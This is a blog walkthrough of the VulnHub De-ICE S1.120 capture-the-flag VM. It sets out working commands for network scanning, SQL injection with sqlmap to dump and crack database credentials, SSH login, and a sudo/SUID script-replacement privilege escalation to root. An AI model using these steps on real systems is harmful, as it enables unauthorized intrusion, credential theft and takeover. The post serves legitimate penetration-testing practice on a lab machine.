<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the De-ICE: S1.120 VM (Boot to Root)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-de-ice-s1-120-vm-boot-to-root/" rel="bookmark"><time class="entry-date published" datetime="2016-07-15T10:24:40+00:00">July 15, 2016</time><time class="updated" datetime="2025-06-10T20:13:18+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as <strong>De-ICE: S1.120 and</strong> it is another boot2root challenge provided for practice and its security level is for the beginners. So let’s try to break through it. But before please note that you can download it from here <a style="color: #000000;" href="https://www.vulnhub.com/entry/de-ice-s1120,10/">https://www.vulnhub.com/entry/de-ice-s1120,10/</a></span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies</strong></span></p>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">SQLMAP Scanning</span></li>
<li><span style="color: #000000;">Extract databases and user credentials</span></li>
<li><span style="color: #000000;">SSH access to the target with a specific user</span></li>
<li><span style="color: #000000;">Exploiting target with SUID bit and SUDO binaries</span></li>
<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Start!!!</strong></span></p>
<p><span style="color: #000000;">Start off with finding the target using:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tlZ-mWn0DIE/W0sgugzMYNI/AAAAAAAAYJU/Q4ghT4CMy0w0H8RZa2aom7nlaY54LdygQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Our target is <strong>192.168.1.120</strong> Now scan the target with nmap :</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.120</pre>
<p><span style="color: #000000;">With the nmap scan, you can see the ports 80, 443, 3306,21, 22 are open. Let’s target the port 80 first.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DLMjISVZYhc/W0sgvdcSD0I/AAAAAAAAYJo/wKHVa-Gt7icAbxwcgTQt8ng7QJeK9lMvACEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Now we will browse the website with http://192.168.1.120 and a page will open as shown below in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iKDgBj-BKG0/W0sgvYdDsNI/AAAAAAAAYJk/CVRtWS9NM_QcmHnqhpycfmTSSyR2UwsHQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Click on the <strong><em>Add Product </em></strong>option as shown in the above page http://192.168.1.120 which will redirect to http://192.168.1.120/add_product.php.Enter the input in the fields as shown below and click on Submit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-at4YcnXQglI/W0sgvqM3uEI/AAAAAAAAYJs/vRnREaBmH74t_f7mEnBzHpiJnjNEOvI9wCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Upon submission, the following page will display.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-wAs4-W66WPY/W0sgwRNmSDI/AAAAAAAAYJw/dBtxiqCCxx4cIl7a3YoqtrmNNfrZKeQbACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now let’s try to look for SQL injection by trying with http://192.168.1.120/products.php?id=1’ and we will get an error, hence this URL is prone to SQL injection</span></p>
<p><span style="color: #000000;">Lets’ enumerate the databases with <strong>SQLMAP</strong> command to get more details</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.120/products.php?id=1 --dbs --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lazQR0trEGc/W0sgwQzlk3I/AAAAAAAAYJ0/yOlHGaSPukwvuZckflI_fh1uzLjDbRAoQCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Upon successful completion of the SQLMAP scan, we came to know that the following databases listed are available on the website.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Sjes5Rzdqxc/W0sgwh-f1iI/AAAAAAAAYJ4/n1-3XSxSjXo3J8xHRYKrk3vY67hXdhibwCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Extract the user information from the <strong>MySQL database</strong>, using SQLMAP following command:</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.120/products.php?id=1 -D mysql --users --passwords --batch</pre>
<p><span style="color: #000000;">In addition, SQLMAP will also automatically perform the password cracking of the users’ passwords</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-SK_QBH_z_Qo/W0sgw74I_PI/AAAAAAAAYJ8/9PR2CHvYkwYY1Yf6op5FY4lDH99wNMCmQCEwYBhgL/s1600/9.png"/></strong></span></p>
<p><span style="color: #000000;">After having found valid credentials the next thing to perform is to test them over SSH to see if we have access to the target server. I tried to login with most of the users to see if there’s any root user or has something interesting for us to investigate further and it seems that all users can login to the system.</span></p>
<p><span style="color: #000000;">After trying with many usernames, I did SSH using the username as <strong>ccoffee </strong>and ran the following command to enumerate all binaries having SUID permission.</span></p>
<pre class="lang:default decode:true">ssh ccoffee@192.168.1.120
find / -perm –u=s –type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EQZmHErzb5M/W0sgunGixgI/AAAAAAAAYJY/ucFVDyZsMd4YhLUnE7M60GKszyiMY3YYQCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">As it can be seen from the screenshot that of all the users listed, the user <strong>ccoffee</strong> has SUID bit enabled for <strong>getlogs.sh </strong>command located at the path /home/ccoffee/scripts, which means we can execute any command within<strong> getlogs.sh </strong>command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-t-1CZENOfdQ/W0sguglkaZI/AAAAAAAAYJc/Pca8-x4P5kYFT1en-IRTXAPBinjYOVBCwCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">At this moment, let’s also check the contents of the sudo file</span></p>
<pre class="lang:default decode:true">sudo –l</pre>
<p><span style="color: #000000;">On performing sudo –l, we observed that there is no password (NOPASSWD) set for this user while executing the command /home/ccoffee/scripts/getlogs.sh (i.e he can also run as sudo, the same script for which SUID bit is also set)</span></p>
<p><span style="color: #000000;">Now let’s navigate to the path cd /home/coffee/scripts</span></p>
<pre class="lang:default decode:true">cd /home/ccoffee/scripts/</pre>
<p><span style="color: #000000;">Upon listing, we can confirm that <strong>getlogs.sh</strong> has SUID bit set.</span></p>
<pre class="lang:default decode:true">ls -al</pre>
<p><span style="color: #000000;">Move the getlogs.sh to getlogs.sh.bak, and then create a new getlogs.sh file with the following code to spawn a shell.</span></p>
<pre class="lang:default decode:true">mv getlogs.sh getlogs.sh.bak
echo "/bin/bash" &gt;  getlogs.sh
chmod 777 getlogs.sh</pre>
<p><span style="color: #000000;">Run the new getlogs.sh script with sudo as follows :</span></p>
<pre class="lang:default decode:true">sudo /home/ccoffee/scripts/getlogs.sh</pre>
<p><span style="color: #000000;">Once the script execution is finished, you will reach the root. And to confirm this type:</span></p>
<pre class="lang:default decode:true ">id</pre>
<p><span style="color: #000000;">Hurrah! We have got the root access.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-elS46oY76yg/W0sgvKDHw4I/AAAAAAAAYJg/gyf5tGMlaKEcE6vfejUI-_6v1_QS-i_1ACEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact <strong><a href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
